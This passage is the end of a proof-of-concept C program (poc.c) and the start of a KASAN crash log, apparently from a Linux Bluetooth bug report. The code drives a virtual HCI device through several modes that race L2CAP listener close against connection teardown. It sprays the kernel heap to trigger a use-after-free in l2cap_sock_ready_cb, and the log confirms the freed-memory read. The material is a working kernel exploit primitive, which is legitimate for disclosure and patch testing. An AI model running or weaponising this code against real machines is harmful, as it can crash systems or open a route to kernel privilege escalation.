	payload = buf + 1 + sizeof(*acl) + sizeof(*lh);
	rem = len - (size_t)(payload - buf);
	if (l2len > rem)
		l2len = (uint16_t)rem;
	send_num_comp_pkts(handle, 1);
	__sync_add_and_fetch(&stat_acl, 1);
	if (cid != L2CAP_CID_SIGNALING)
		return;
	while (l2len >= sizeof(struct l2cap_cmd_hdr)) {
		const struct l2cap_cmd_hdr *cmd = (const struct l2cap_cmd_hdr *)payload;
		uint16_t clen = cmd->len;

		if (l2len < sizeof(*cmd) + clen)
			break;
		if (cmd->code == L2CAP_INFO_REQ) {
			const uint16_t *typep = (const uint16_t *)(payload + sizeof(*cmd));

			info_ident = cmd->ident;
			info_type = (clen >= 2) ? *typep : L2CAP_IT_FEAT_MASK;
			saw_info_req = true;
			__sync_add_and_fetch(&stat_info_req, 1);
		}
		payload += sizeof(*cmd) + clen;
		l2len -= sizeof(*cmd) + clen;
	}
}

static void *reader_thread(void *arg)
{
	(void)arg;
	pin_cpu(0);
	while (running) {
		uint8_t buf[4096];
		ssize_t n = read(vhci_fd, buf, sizeof(buf));

		if (n <= 0)
			break;
		if (buf[0] == HCI_COMMAND_PKT)
			process_hci_command(buf + 1, (size_t)(n - 1));
		else if (buf[0] == HCI_ACLDATA_PKT)
			process_acl_from_host(buf, (size_t)n);
	}
	return NULL;
}

static int mgmt_cmd(uint16_t opcode, uint16_t index, const void *data, uint16_t dlen)
{
	int fd;
	struct sockaddr_hci addr;
	struct mgmt_hdr hdr;
	uint8_t buf[128];

	fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
	if (fd < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.hci_family = AF_BLUETOOTH;
	addr.hci_dev = HCI_DEV_NONE;
	addr.hci_channel = HCI_CHANNEL_CONTROL;
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		close(fd);
		return -1;
	}
	hdr.opcode = opcode;
	hdr.index = index;
	hdr.len = dlen;
	memcpy(buf, &hdr, sizeof(hdr));
	if (dlen)
		memcpy(buf + sizeof(hdr), data, dlen);
	if (write(fd, buf, sizeof(hdr) + dlen) < 0) {
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static void init_vhci(void)
{
	int hci_sock;
	struct vhci_vendor_pkt_request req;
	uint8_t buf[1024];
	ssize_t n;
	int tries = 0;
	pthread_t th;

	hci_sock = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
	if (hci_sock < 0)
		die("socket hci");
	vhci_fd = open("/dev/vhci", O_RDWR);
	if (vhci_fd < 0)
		die("open /dev/vhci");
	req.type = HCI_VENDOR_PKT;
	req.opcode = 0;
	if (write(vhci_fd, &req, sizeof(req)) != (ssize_t)sizeof(req))
		die("write vendor pkt");
	while (tries++ < 64) {
		n = read(vhci_fd, buf, sizeof(buf));
		if (n < 0)
			die("read vhci init");
		if (n < 1)
			continue;
		if (buf[0] == HCI_COMMAND_PKT && n >= 4) {
			process_hci_command(buf + 1, (size_t)(n - 1));
			continue;
		}
		if (buf[0] == HCI_VENDOR_PKT && n >= 4) {
			hci_dev_id = *(uint16_t *)(buf + 2);
			break;
		}
	}
	if (hci_dev_id < 0) {
		fprintf(stderr, "failed to obtain vhci dev id\n");
		exit(1);
	}
	fprintf(stderr, "[+] vhci dev id: %d\n", hci_dev_id);
	if (pthread_create(&th, NULL, reader_thread, NULL) != 0)
		die("pthread_create reader");
	{
		int rfd = open("/dev/rfkill", O_WRONLY);

		if (rfd >= 0) {
			struct {
				uint32_t idx;
				uint8_t type;
				uint8_t op;
				uint8_t soft;
				uint8_t hard;
			} __attribute__((packed)) ev = { 0, 0, 2, 0, 0 };

			(void)write(rfd, &ev, sizeof(ev));
			close(rfd);
		}
	}
	if (ioctl(hci_sock, HCIDEVUP, hci_dev_id) < 0 && errno != EALREADY)
		perror("ioctl HCIDEVUP");
	{
		struct hci_dev_req dr;

		memset(&dr, 0, sizeof(dr));
		dr.dev_id = (uint16_t)hci_dev_id;
		dr.dev_opt = SCAN_PAGE | SCAN_INQUIRY;
		if (ioctl(hci_sock, HCISETSCAN, &dr) < 0)
			perror("ioctl HCISETSCAN");
	}
	close(hci_sock);
	{
		uint8_t on = 1;
		int i;

		for (i = 0; i < 3; i++) {
			(void)mgmt_cmd(MGMT_OP_SET_POWERED, (uint16_t)hci_dev_id, &on, 1);
			(void)mgmt_cmd(MGMT_OP_SET_CONNECTABLE, (uint16_t)hci_dev_id, &on, 1);
			(void)mgmt_cmd(MGMT_OP_SET_BONDABLE, (uint16_t)hci_dev_id, &on, 1);
			(void)mgmt_cmd(MGMT_OP_SET_DISCOVERABLE, (uint16_t)hci_dev_id, &on, 1);
			usleep(200000);
		}
	}
}

static bool wait_flag(volatile bool *flag, int timeout_ms)
{
	int i;

	for (i = 0; i < timeout_ms; i++) {
		if (*flag)
			return true;
		usleep(1000);
	}
	return false;
}

static void next_peer(unsigned long attempt)
{
	memset(&cur_remote, 0, sizeof(cur_remote));
	cur_remote.b[0] = 0xaa;
	cur_remote.b[1] = 0xaa;
	cur_remote.b[2] = 0xaa;
	cur_remote.b[3] = (uint8_t)(attempt >> 16);
	cur_remote.b[4] = (uint8_t)(attempt >> 8);
	cur_remote.b[5] = (uint8_t)attempt;
	cur_handle = (uint16_t)(0x0001 + (attempt % 0x00c8));
}

static void *netns_churn_thread(void *arg)
{
	(void)arg;
	while (running) {
		pid_t pid = fork();

		if (pid == 0) {
			pid_t g = fork();

			if (g == 0) {
				(void)unshare(CLONE_NEWNET);
				_exit(0);
			}
			_exit(0);
		}
		if (pid > 0) {
			int st;
			(void)waitpid(pid, &st, 0);
		}
		usleep(2000);
	}
	return NULL;
}

static int accept_fd = -1;

static void *accept_thread(void *arg)
{
	int fd = (int)(intptr_t)arg;
	struct sockaddr_l2 addr;
	socklen_t len = sizeof(addr);

	(void)accept(fd, (struct sockaddr *)&addr, &len);
	return NULL;
}

static void teardown_hammer(unsigned long max_attempts, int worker)
{
	unsigned long attempt;
	pthread_t closer;

	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, close_thread, NULL) != 0)
		die("pthread_create closer");
	fprintf(stderr, "[+] teardown-hammer worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		uint16_t handle;
		next_peer(attempt + (unsigned long)worker * 100000);
		handle = cur_handle;
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		close_armed = close_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;

		send_conn_request();
		/* Wait until child is actually queued. */
		if (!wait_flag(&saw_info_req, 300)) {
			if ((attempt <= 5) || (attempt % 200 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no INFO_REQ\n", worker, attempt);
		}

		/* Child is queued. Race parent close against DISCONN teardown. */
		close_delay_us = (unsigned int)(attempt % 8);
		close_armed = true;
		send_disconn_complete(handle);

		if (!wait_flag(&close_done, 100))
			close_listener_now();
		if (listener_fd >= 0)
			close_listener_now();
		send_disconn_complete(handle);
		if ((attempt <= 5) || (attempt % 200 == 0))
			fprintf(stderr, "[+] w%d attempt %lu info=%llu close=%llu accept=%d\n",
				worker, attempt, stat_info_req, stat_close, saw_accept_conn);
	}
}


static volatile int spin_go;
static int spin_fds[4];

static void make_fifo(void)
{
	struct sched_param sp;

	memset(&sp, 0, sizeof(sp));
	sp.sched_priority = 1;
	(void)pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
}

static void *spin_last_close_thread(void *arg)
{
	int idx = (int)(intptr_t)arg;

	pin_cpu((idx + 1) & 1);
	while (running) {
		while (running && !spin_go)
			__asm__ __volatile__("pause");
		if (!running)
			break;
		int fd = spin_fds[idx];
		if (fd >= 0) {
			spin_fds[idx] = -1;
			close(fd);
			__sync_add_and_fetch(&stat_close, 1);
		}
	}
	return NULL;
}

/* Close around CONN_COMPLETE, keep ACL up so info_timeout can fire ready_cb. */
static void syzbot_race(unsigned long max_attempts, int worker)
{
	unsigned long attempt;
	uint16_t live[32];
	int nlive = 0;
	unsigned long info_seen = 0, accept_seen = 0, info_after = 0;
	pthread_t closer;

	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, close_thread, NULL) != 0)
		die("pthread_create closer");
	fprintf(stderr, "[+] syzbot-race worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		bool info;

		next_peer(attempt + (unsigned long)worker * 100000);
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		close_armed = close_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;
		send_conn_request();
		(void)wait_flag(&saw_accept_conn, 40);
		close_delay_us = (unsigned int)(attempt % 64);
		close_armed = true;
		if ((attempt % 5) == 0)
			close_listener_now();
		if (!wait_flag(&close_done, 80))
			close_listener_now();
		if (listener_fd >= 0)
			close_listener_now();
		info = wait_flag(&saw_info_req, 40);
		if (saw_accept_conn)
			accept_seen++;
		if (info) {
			info_seen++;
			if (close_done)
				info_after++;
		}
		live[nlive++] = cur_handle;
		if ((attempt <= 5) || (attempt % 16 == 0))
			fprintf(stderr, "[+] w%d attempt %lu accept=%llu info=%llu info_close=%llu handle=0x%x\n",
				worker, attempt, accept_seen, info_seen, info_after, cur_handle);
		if (nlive >= 16 || attempt == max_attempts) {
			int i;

			fprintf(stderr, "[+] w%d waiting info_timeout for %d conns\n", worker, nlive);
			usleep(4300000);
			for (i = 0; i < nlive; i++)
				send_disconn_complete(live[i]);
			usleep(30000);
			nlive = 0;
		}
	}
}

/* Child already queued; busy-spin last close against DISCONN teardown. */
static void busy_teardown(unsigned long max_attempts, int worker)
{
	unsigned long attempt;
	pthread_t closer[4];
	int t;

	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	spin_go = 0;
	for (t = 0; t < 4; t++) {
		spin_fds[t] = -1;
		if (pthread_create(&closer[t], NULL, spin_last_close_thread, (void *)(intptr_t)t) != 0)
			die("pthread_create spin closer");
	}
	fprintf(stderr, "[+] busy-teardown worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd, i;
		uint16_t handle;

		next_peer(attempt + (unsigned long)worker * 100000);
		handle = cur_handle;
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		spin_go = 0;
		for (i = 0; i < 4; i++)
			spin_fds[i] = -1;
		fd = setup_fixed_listener();
		listener_fd = fd;
		send_conn_request();
		if (!wait_flag(&saw_info_req, 300)) {
			if ((attempt <= 5) || (attempt % 200 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no INFO_REQ\n", worker, attempt);
			close(fd);
			listener_fd = -1;
			send_disconn_complete(handle);
			continue;
		}
		for (i = 0; i < 4; i++) {
			spin_fds[i] = dup(fd);
			if (spin_fds[i] < 0)
				die("dup listener");
		}
		close(fd);
		listener_fd = -1;
		__sync_synchronize();
		spin_go = 1;
		send_disconn_complete(handle);
		usleep((attempt % 8) ? (attempt % 8) : 1);
		for (i = 0; i < 4; i++) {
			if (spin_fds[i] >= 0) {
				int tmp = spin_fds[i];
				spin_fds[i] = -1;
				close(tmp);
			}
		}
		spin_go = 0;
		spray_kmalloc_2k();
		send_disconn_complete(handle);
		if ((attempt <= 5) || (attempt % 200 == 0))
			fprintf(stderr, "[+] w%d attempt %lu info=%llu close=%llu\n",
				worker, attempt, stat_info_req, stat_close);
	}
	running = false;
	spin_go = 1;
}


/*
 * Do not auto-complete on ACCEPT. Race parent close against CONN_COMPLETE so
 * l2cap_global_fixed_chan can observe BT_LISTEN, then teardown can run before
 * l2cap_new_connection() uses the held pchan.
 */
static void lookup_close_race(unsigned long max_attempts, int worker)
{
	unsigned long attempt;
	uint16_t live[32];
	int nlive = 0;
	unsigned long accept_seen = 0, info_seen = 0;
	pthread_t closer, completer;

	auto_conn_complete = false;
	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, close_thread, NULL) != 0)
		die("pthread_create closer");
	if (pthread_create(&completer, NULL, complete_thread, NULL) != 0)
		die("pthread_create completer");
	fprintf(stderr, "[+] lookup-close-race worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		bool info;

		next_peer(attempt + (unsigned long)worker * 100000);
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		close_armed = close_done = false;
		complete_armed = complete_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;
		send_conn_request();
		if (!wait_flag(&saw_accept_conn, 300)) {
			if ((attempt <= 5) || (attempt % 32 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no ACCEPT\n", worker, attempt);
			close_listener_now();
			continue;
		}
		accept_seen++;
		if ((attempt % 2) == 0) {
			close_delay_us = 0;
			complete_delay_us = (unsigned int)(attempt % 24);
		} else {
			complete_delay_us = 0;
			close_delay_us = (unsigned int)(attempt % 24);
		}
		close_armed = true;
		complete_armed = true;
		if (!wait_flag(&complete_done, 200)) {
			send_conn_complete(0);
			send_remote_features(cur_handle);
			complete_done = true;
			complete_armed = false;
		}
		if (!wait_flag(&close_done, 200))
			close_listener_now();
		if (listener_fd >= 0)
			close_listener_now();
		spray_kmalloc_2k();
		info = wait_flag(&saw_info_req, 80);
		if (info)
			info_seen++;
		live[nlive++] = cur_handle;
		if ((attempt <= 5) || (attempt % 16 == 0))
			fprintf(stderr, "[+] w%d attempt %lu accept=%llu info=%llu close=%llu handle=0x%x delays c=%u x=%u\n",
				worker, attempt, accept_seen, info_seen, stat_close, cur_handle,
				complete_delay_us, close_delay_us);
		if (nlive >= 12 || attempt == max_attempts) {
			int i;

			fprintf(stderr, "[+] w%d waiting info_timeout for %d conns\n", worker, nlive);
			usleep(4300000);
			for (i = 0; i < nlive; i++)
				send_disconn_complete(live[i]);
			usleep(30000);
			nlive = 0;
		}
	}
}


/*
 * Split teardown from the last sock_put: shutdown() runs cleanup_listen and
 * sets BT_CLOSED, then a tunable gap lets l2cap_new_connection() enqueue onto
 * the still-alive parent, then close() frees it before INFO_RSP/ready_cb.
 */
static void shutdown_gap_race(unsigned long max_attempts, int worker)
{
	static const unsigned int gaps[] = {
		0, 0, 1, 2, 5, 10, 20, 50, 100, 200, 500, 1000, 2000, 5000
	};
	unsigned long attempt;
	unsigned long accept_seen = 0, info_seen = 0, rsp_seen = 0;
	pthread_t closer, completer;

	auto_conn_complete = false;
	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, shutdown_gap_thread, NULL) != 0)
		die("pthread_create shutdown closer");
	if (pthread_create(&completer, NULL, complete_thread, NULL) != 0)
		die("pthread_create completer");
	fprintf(stderr, "[+] shutdown-gap-race worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		bool info;
		uint16_t handle;

		next_peer(attempt + (unsigned long)worker * 100000);
		handle = cur_handle;
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		info_type = L2CAP_IT_FEAT_MASK;
		close_armed = close_done = false;
		complete_armed = complete_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;
		send_conn_request();
		if (!wait_flag(&saw_accept_conn, 300)) {
			if ((attempt <= 5) || (attempt % 100 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no ACCEPT\n", worker, attempt);
			if (listener_fd >= 0)
				close_listener_now();
			send_disconn_complete(handle);
			continue;
		}
		accept_seen++;
		shutdown_gap_us = gaps[attempt % (sizeof(gaps) / sizeof(gaps[0]))];
		complete_delay_us = (unsigned int)((attempt / 3) % 24);
		close_armed = true;
		complete_armed = true;
		if (!wait_flag(&complete_done, 200)) {
			send_conn_complete(0);
			send_remote_features(cur_handle);
			complete_done = true;
			complete_armed = false;
		}
		if (!wait_flag(&close_done, 200))
			close_listener_now();
		if (listener_fd >= 0)
			close_listener_now();
		info = wait_flag(&saw_info_req, 80);
		if (info) {
			info_seen++;
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			usleep(2000);
		}
		spray_kmalloc_2k();
		send_disconn_complete(handle);
		if ((attempt <= 5) || (attempt % 50 == 0))
			fprintf(stderr, "[+] w%d attempt %lu accept=%lu info=%lu rsp=%lu close=%llu gap=%u cd=%u\n",
				worker, attempt, accept_seen, info_seen, rsp_seen, stat_close,
				shutdown_gap_us, complete_delay_us);
	}
}


/*
 * Lean close vs CONN_COMPLETE: let lookup observe BT_LISTEN, let close() win
 * chan_lock for teardown, then new_connection runs in the gap before kill.
 * Fire INFO_RSP immediately so ready_cb does not wait 4s.
 */
static void close_kill_race(unsigned long max_attempts, int worker)
{
	unsigned long attempt;
	unsigned long accept_seen = 0, info_seen = 0, rsp_seen = 0;
	pthread_t closer, completer;

	auto_conn_complete = false;
	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, close_thread, NULL) != 0)
		die("pthread_create closer");
	if (pthread_create(&completer, NULL, complete_thread, NULL) != 0)
		die("pthread_create completer");
	fprintf(stderr, "[+] close-kill-race worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		bool info;
		uint16_t handle;

		next_peer(attempt + (unsigned long)worker * 100000);
		handle = cur_handle;
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		info_type = L2CAP_IT_FEAT_MASK;
		close_armed = close_done = false;
		complete_armed = complete_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;
		send_conn_request();
		if (!wait_flag(&saw_accept_conn, 200)) {
			if ((attempt <= 5) || (attempt % 200 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no ACCEPT\n", worker, attempt);
			if (listener_fd >= 0)
				close_listener_now();
			send_disconn_complete(handle);
			continue;
		}
		accept_seen++;
		/* Complete first so lookup can run; close chases teardown/kill. */
		complete_delay_us = (unsigned int)(attempt % 4);
		close_delay_us = (unsigned int)((attempt * 3) % 12);
		complete_armed = true;
		close_armed = true;
		if (!wait_flag(&complete_done, 150)) {
			send_conn_complete(0);
			send_remote_features(cur_handle);
			complete_done = true;
			complete_armed = false;
		}
		if (!wait_flag(&close_done, 150))
			close_listener_now();
		if (listener_fd >= 0)
			close_listener_now();
		info = wait_flag(&saw_info_req, 50);
		if (info) {
			info_seen++;
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			usleep(1000);
		}
		spray_kmalloc_2k();
		send_disconn_complete(handle);
		if ((attempt <= 5) || (attempt % 200 == 0))
			fprintf(stderr, "[+] w%d attempt %lu accept=%lu info=%lu rsp=%lu close=%llu cd=%u xd=%u\n",
				worker, attempt, accept_seen, info_seen, rsp_seen, stat_close,
				complete_delay_us, close_delay_us);
	}
}


/*
 * 870187 still lacks sock_hold(parent). 9db7e rejects enqueue after BT_CLOSED,
 * so GAP-2/mode 7 no longer UAFs. Remaining window: child already queued while
 * parent is LISTEN, then INFO_RSP/ready_cb races last close/kill.
 */
static void enqueue_ready_close_race(unsigned long max_attempts, int worker)
{
	unsigned long attempt;
	unsigned long accept_seen = 0, info_seen = 0, rsp_seen = 0;
	pthread_t closer, completer;

	auto_conn_complete = false;
	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, close_thread, NULL) != 0)
		die("pthread_create closer");
	if (pthread_create(&completer, NULL, complete_thread, NULL) != 0)
		die("pthread_create completer");
	fprintf(stderr, "[+] enqueue-ready-close worker %d cid=0x%x attempts=%lu\n",
		worker, fixed_cid, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		unsigned int phase = (unsigned int)(attempt % 6);
		unsigned int i;
		uint16_t handle;

		next_peer(attempt + (unsigned long)worker * 100000);
		handle = cur_handle;
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		info_type = L2CAP_IT_FEAT_MASK;
		close_armed = close_done = false;
		complete_armed = complete_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;
		send_conn_request();
		if (!wait_flag(&saw_accept_conn, 200)) {
			if ((attempt <= 5) || (attempt % 200 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no ACCEPT\n", worker, attempt);
			if (listener_fd >= 0)
				close_listener_now();
			send_disconn_complete(handle);
			continue;
		}
		accept_seen++;
		complete_delay_us = 0;
		complete_armed = true;
		if (!wait_flag(&complete_done, 150)) {
			send_conn_complete(0);
			send_remote_features(cur_handle);
			complete_done = true;
			complete_armed = false;
		}
		if (!wait_flag(&saw_info_req, 200)) {
			if ((attempt <= 5) || (attempt % 200 == 0))
				fprintf(stderr, "[-] w%d attempt %lu no INFO_REQ\n", worker, attempt);
			if (listener_fd >= 0)
				close_listener_now();
			send_disconn_complete(handle);
			continue;
		}
		info_seen++;
		close_delay_us = (unsigned int)(attempt % 16);
		switch (phase) {
		case 0:
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			close_listener_now();
			close_done = true;
			break;
		case 1:
			close_listener_now();
			close_done = true;
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			break;
		case 2:
			close_armed = true;
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			if (!wait_flag(&close_done, 150))
				close_listener_now();
			break;
		case 3:
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			close_armed = true;
			if (!wait_flag(&close_done, 150))
				close_listener_now();
			break;
		case 4:
			close_armed = true;
			for (i = 0; i < (unsigned int)(attempt % 256); i++)
				__asm__ __volatile__("pause");
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			if (!wait_flag(&close_done, 150))
				close_listener_now();
			break;
		default:
			close_armed = true;
			if (close_delay_us)
				usleep(close_delay_us);
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			rsp_seen++;
			if (!wait_flag(&close_done, 150))
				close_listener_now();
			break;
		}
		if (listener_fd >= 0)
			close_listener_now();
		spray_kmalloc_2k();
		send_disconn_complete(handle);
		if ((attempt <= 5) || (attempt % 200 == 0))
			fprintf(stderr, "[+] w%d attempt %lu accept=%lu info=%lu rsp=%lu close=%llu phase=%u xd=%u\n",
				worker, attempt, accept_seen, info_seen, rsp_seen, stat_close,
				phase, close_delay_us);
	}
}

static void run_worker(unsigned long max_attempts, int worker, int timeout_mode)
{
	unsigned int delays_us[] = {
		0, 0, 1, 2, 5, 10, 20, 50, 100, 200, 500, 1000, 2000, 5000
	};
	pthread_t closer;
	unsigned long attempt;

	fixed_cid = (uint16_t)(0xfffa - worker);
	pin_cpu(worker & 1);
	init_vhci();
	if (pthread_create(&closer, NULL, close_thread, NULL) != 0)
		die("pthread_create closer");
	fprintf(stderr, "[+] worker %d cid=0x%x timeout_mode=%d attempts=%lu\n",
		worker, fixed_cid, timeout_mode, max_attempts);

	for (attempt = 1; running && attempt <= max_attempts; attempt++) {
		int fd;
		unsigned int delay = delays_us[(attempt - 1) % (sizeof(delays_us) / sizeof(delays_us[0]))];
		int mode = timeout_mode ? 4 : (int)((attempt - 1) % 4);
		uint16_t handle;

		next_peer(attempt + (unsigned long)worker * 100000);
		handle = cur_handle;
		saw_accept_conn = saw_reject_conn = saw_info_req = false;
		info_ident = 0;
		info_type = L2CAP_IT_FEAT_MASK;
		close_armed = close_done = false;
		fd = setup_fixed_listener();
		listener_fd = fd;
		if ((attempt <= 4) || (attempt % 25 == 0))
			fprintf(stderr, "[+] w%d attempt %lu mode=%d delay_us=%u handle=0x%x\n",
				worker, attempt, mode, delay, handle);

		send_conn_request();
		if (!wait_flag(&saw_info_req, 2000) && (attempt <= 4 || attempt % 25 == 0))
			fprintf(stderr, "[-] w%d attempt %lu no INFO_REQ\n", worker, attempt);

		close_delay_us = delay;
		close_done = false;
		switch (mode) {
		case 0:
			close_armed = true;
			usleep(delay ? delay : 1);
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			send_disconn_complete(handle);
			break;
		case 1:
			close_armed = true;
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			break;
		case 2:
			close_armed = true;
			send_disconn_complete(handle);
			break;
		case 3:
			send_info_rsp(info_ident ? info_ident : 1, info_type);
			close_armed = true;
			send_disconn_complete(handle);
			break;
		default:
			/* syzbot-like: do not answer INFO_REQ; close parent; wait info_timeout. */
			close_armed = true;
			if (!wait_flag(&close_done, 200))
				close_listener_now();
			spray_kmalloc_2k();
			usleep(4300000);
			send_disconn_complete(handle);
			break;
		}

		if (mode != 4) {
			if (!wait_flag(&close_done, 200))
				close_listener_now();
			close_armed = false;
			if (listener_fd >= 0)
				close_listener_now();
			send_disconn_complete(handle);
			usleep(2000);
		}
		if ((attempt <= 4) || (attempt % 25 == 0))
			fprintf(stderr, "[+] w%d stats info=%llu rsps=%llu close=%llu\n",
				worker, stat_info_req, stat_info_rsp, stat_close);
	}
}

int main(int argc, char **argv)
{
	unsigned long max_attempts = 200;
	int nproc = 4;
	int i;
	int timeout_mode = 1;
	pid_t workers[4];

	if (argc > 1)
		max_attempts = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		nproc = atoi(argv[2]);
	if (argc > 3)
		timeout_mode = atoi(argv[3]);
	if (nproc < 1)
		nproc = 1;
	if (nproc > 4)
		nproc = 4;
	if (timeout_mode >= 2 && timeout_mode <= 8) {
		void (*fn)(unsigned long, int) = teardown_hammer;

		setvbuf(stderr, NULL, _IONBF, 0);
		if (timeout_mode == 3)
			fn = syzbot_race;
		else if (timeout_mode == 4)
			fn = busy_teardown;
		else if (timeout_mode == 5)
			fn = lookup_close_race;
		else if (timeout_mode == 6)
			fn = shutdown_gap_race;
		else if (timeout_mode == 7)
			fn = close_kill_race;
		else if (timeout_mode == 8)
			fn = enqueue_ready_close_race;
	fprintf(stderr, "[+] parent-UAF PoC: mode=%d nproc=%d attempts=%lu\n",
			timeout_mode, nproc, max_attempts);
		for (i = 1; i < nproc; i++) {
			pid_t pid = fork();

			if (pid == 0) {
				prctl(PR_SET_PDEATHSIG, SIGTERM);
				fn(max_attempts, i);
				_exit(0);
			}
			if (pid < 0)
				die("fork");
			workers[i] = pid;
		}
		fn(max_attempts, 0);
		for (i = 1; i < nproc; i++) {
			int st;
			(void)waitpid(workers[i], &st, 0);
		}
		running = false;
		return 0;
	}

	
	setvbuf(stderr, NULL, _IONBF, 0);
	fprintf(stderr, "[+] parent-UAF PoC: SOCK_STREAM listen(0) nproc=%d timeout_mode=%d\n",
		nproc, timeout_mode);
	for (i = 1; i < nproc; i++) {
		pid_t pid = fork();

		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGTERM);
			run_worker(max_attempts, i, timeout_mode || (i >= 2));
			_exit(0);
		}
		if (pid < 0)
			die("fork");
		workers[i] = pid;
	}
	run_worker(max_attempts, 0, timeout_mode);
	for (i = 1; i < nproc; i++) {
		int st;
		(void)waitpid(workers[i], &st, 0);
	}
	running = false;
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[   22.908671] BUG: KASAN: slab-use-after-free in l2cap_sock_ready_cb (net/bluetooth/l2cap_sock.c:1824)
[   22.944570] Read of size 8 at addr ffff888005389d08 by task kworker/u17:4/289
[   22.973649] 
[   22.981360] CPU: 2 UID: 0 PID: 289 Comm: kworker/u17:4 Not tainted 7.2.0-rc6-01475-gd165de3d1c70 #4 PREEMPT(full) 
[   22.981372] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   22.981376] Workqueue: hci0 hci_rx_work
[   22.981386] Call Trace:
[   22.981389]  <TASK>
[   22.981391]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   22.981397]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
[   22.981402]  ? __pfx__raw_spin_lock_irqsave (include/asm-generic/qrwlock.h:122 (discriminator 4))
[   22.981406]  ? kasan_complete_mode_report_info (mm/kasan/report_generic.c:178)
[   22.981409]  kasan_report (mm/kasan/report.c:595)
[   22.981412]  ? l2cap_sock_ready_cb (net/bluetooth/l2cap_sock.c:1824)
[   22.981416]  ? l2cap_sock_ready_cb (net/bluetooth/l2cap_sock.c:1824)
[   22.981420]  __asan_report_load8_noabort (mm/kasan/report_generic.c:381 (discriminator 1))
[   22.981425]  l2cap_sock_ready_cb (net/bluetooth/l2cap_sock.c:1824)
[   22.981428]  l2cap_chan_ready.part.0 (net/bluetooth/l2cap_core.c:1300)
[   22.981432]  l2cap_conn_start (net/bluetooth/l2cap_core.c:1283 net/bluetooth/l2cap_core.c:1556)
[   22.981435]  ? work_grab_pending (kernel/workqueue.c:2107 kernel/workqueue.c:2200)
[   22.981439]  ? __pfx_l2cap_conn_start (net/bluetooth/l2cap_core.c:427)
[   22.981442]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   22.981444]  ? __cancel_work (include/linux/instrumented.h:97 include/linux/atomic/atomic-instrumented.h:3223 kernel/workqueue.c:807 kernel/workqueue.c:834 kernel/workqueue.c:4472)
